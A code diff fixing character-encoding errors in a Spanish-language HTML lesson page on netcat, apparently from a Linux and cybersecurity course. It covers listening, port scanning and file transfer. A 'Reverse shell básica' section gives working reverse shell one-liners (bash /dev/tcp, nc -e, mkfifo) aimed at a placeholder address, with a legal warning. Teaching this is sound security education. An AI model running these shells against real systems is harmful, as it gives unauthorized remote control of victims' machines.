@@ -1,9 +1,9 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>42. Uso de netcat para realizar conexiones | IntroducciÃ³n a Linux</title>
+    <title>42. Uso de netcat para realizar conexiones | Introducción a Linux</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="../../css/styles.css" />
     <style>
@@ -138,28 +138,28 @@
       <ul class="nav-links">
         <li><a href="../../index.html">Cursos</a></li>
         <li><a href="#">Roadmap</a></li>
-        <li><a href="#">ConÃ³cenos</a></li>
+        <li><a href="#">Conócenos</a></li>
       </ul>
       <div class="nav-cta">
-        <button class="btn-ghost">Iniciar sesiÃ³n</button>
+        <button class="btn-ghost">Iniciar sesión</button>
         <button class="btn-accent">Registrarse</button>
       </div>
     </nav>
     <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
       <div class="breadcrumb">
-        <a href="../../index.html">Inicio</a><span>â€º</span>
-        <a href="../../index.html">Cursos</a><span>â€º</span>
-        <a href="../../index.html">IntroducciÃ³n a Linux</a><span>â€º</span>
+        <a href="../../index.html">Inicio</a><span>›</span>
+        <a href="../../index.html">Cursos</a><span>›</span>
+        <a href="../../index.html">Introducción a Linux</a><span>›</span>
         <span style="color: var(--text-2);">Clase 42</span>
       </div>
     </div>
     <div class="lesson-content">
-      <a href="../../index.html" class="back-link">â† Volver al curso</a>
-      <span class="course-tag">ðŸ§ Linux Â· Ciberseguridad</span>
+      <a href="../../index.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
       <h1 class="course-title" style="margin-bottom: 0.5rem;">Uso de netcat para realizar conexiones</h1>
-      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">DuraciÃ³n: 9:15 Â· SecciÃ³n 2: Temario</div>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 9:15 · Sección 2: Temario</div>
 
-      <p>Netcat (<code>nc</code>) es conocido como la "navaja suiza" de las redes. Permite leer y escribir datos a travÃ©s de conexiones TCP/UDP, siendo una herramienta indispensable en el arsenal de cualquier hacker o administrador. En Ubuntu se instala con <code>sudo apt install netcat-openbsd</code>.</p>
+      <p>Netcat (<code>nc</code>) es conocido como la "navaja suiza" de las redes. Permite leer y escribir datos a través de conexiones TCP/UDP, siendo una herramienta indispensable en el arsenal de cualquier hacker o administrador. En Ubuntu se instala con <code>sudo apt install netcat-openbsd</code>.</p>
 
       <h2>Modo cliente y servidor</h2>
       <p>Netcat puede actuar como cliente (conectarse a un puerto) o como servidor (escuchar en un puerto).</p>
@@ -170,20 +170,20 @@ nc -lvnp 4444
 # Modo cliente: conectarse a un servidor
 nc -nv 192.168.1.100 4444
 
-# ExplicaciÃ³n de flags:
+# Explicación de flags:
 # -l : listen (modo escucha)
 # -v : verbose
-# -n : no resolver DNS (mÃ¡s rÃ¡pido)
+# -n : no resolver DNS (más rápido)
 # -p : puerto</code></pre>
 
       <div class="highlight">
-        <strong>ðŸ§  Flags esenciales:</strong> <code>-v</code> para verbose (ver conexiones entrantes), <code>-n</code> para evitar resoluciÃ³n DNS (evita leaks y acelera), <code>-u</code> para UDP en lugar de TCP.
+        <strong>🧠 Flags esenciales:</strong> <code>-v</code> para verbose (ver conexiones entrantes), <code>-n</code> para evitar resolución DNS (evita leaks y acelera), <code>-u</code> para UDP en lugar de TCP.
       </div>
 
       <h2>Escaneo de puertos con nc</h2>
-      <p>Netcat permite escanear puertos de forma sencilla, aunque es mÃ¡s lento que nmap. Ãštil cuando no tenemos nmap disponible.</p>
+      <p>Netcat permite escanear puertos de forma sencilla, aunque es más lento que nmap. Útil cuando no tenemos nmap disponible.</p>
 
-      <pre><code># Escanear un puerto especÃ­fico
+      <pre><code># Escanear un puerto específico
 nc -zv 192.168.1.1 22
 
 # Escanear un rango de puertos
@@ -192,54 +192,54 @@ for port in {1..1024}; do
 done</code></pre>
 
       <h2>Transferencia de archivos</h2>
-      <p>Netcat puede transferir archivos entre mÃ¡quinas sin necesidad de SCP, FTP ni HTTP. Ideal para entornos con herramientas limitadas.</p>
+      <p>Netcat puede transferir archivos entre máquinas sin necesidad de SCP, FTP ni HTTP. Ideal para entornos con herramientas limitadas.</p>
 
-      <pre><code># En la mÃ¡quina receptora (escucha)
+      <pre><code># En la máquina receptora (escucha)
 nc -lvnp 4444 > archivo_recibido.zip
 
-# En la mÃ¡quina emisora (envÃ­a)
+# En la máquina emisora (envía)
 nc -nv 192.168.1.100 4444 < archivo_a_enviar.zip
 
-# TambiÃ©n con tar para directorios completos
+# También con tar para directorios completos
 # Receptor:
 nc -lvnp 4444 | tar xvz
 # Emisor:
 tar czv directorio/ | nc -nv 192.168.1.100 4444</code></pre>
 
-      <h2>Reverse shell bÃ¡sica</h2>
-      <p>Uno de los usos mÃ¡s importantes en pentesting: obtener una shell remota desde la mÃ¡quina vÃ­ctima hacia el atacante.</p>
+      <h2>Reverse shell básica</h2>
+      <p>Uno de los usos más importantes en pentesting: obtener una shell remota desde la máquina víctima hacia el atacante.</p>
 
       <pre><code># Atacante (escucha)
 nc -lvnp 4444
 
-# VÃ­ctima (se conecta de vuelta)
+# Víctima (se conecta de vuelta)
 # Bash
 bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 
-# O con nc (si estÃ¡ instalado en la vÃ­ctima)
+# O con nc (si está instalado en la víctima)
 nc -e /bin/bash 192.168.1.100 4444
 
 # Con mkfifo (cuando nc no tiene -e)
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f</code></pre>
 
       <div class="warning">
-        <strong>âš ï¸ Legal:</strong> El uso de reverse shells sin autorizaciÃ³n explÃ­cita es ilegal. Esta tÃ©cnica debe usarse Ãºnicamente en entornos controlados (laboratorios, CTFs, mÃ¡quinas propias) o con permiso por escrito.
+        <strong>⚠️ Legal:</strong> El uso de reverse shells sin autorización explícita es ilegal. Esta técnica debe usarse únicamente en entornos controlados (laboratorios, CTFs, máquinas propias) o con permiso por escrito.
       </div>
 
       <div class="lesson-nav">
-        <a href="clase-41.html">â† Anterior: Manejo de pares de claves y conexiones SSH</a>
-        <a href="clase-43.html">Siguiente: Uso de conexiones encriptadas â†’</a>
+        <a href="clase-41.html">← Anterior: Manejo de pares de claves y conexiones SSH</a>
+        <a href="clase-43.html">Siguiente: Uso de conexiones encriptadas →</a>
       </div>
     </div>
     <footer>
       <div class="footer-logo">hack4u</div>
       <div class="footer-links">
         <a href="#">Aviso Legal</a>
-        <a href="#">PolÃ­tica de Cookies</a>
+        <a href="#">Política de Cookies</a>
         <a href="#">Privacidad</a>
-        <a href="#">TÃ©rminos y Condiciones</a>
+        <a href="#">Términos y Condiciones</a>
       </div>
-      <div>Â© 2026 hack4u.io â€” Todos los derechos reservados.</div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
     </footer>
   </body>
 </html>
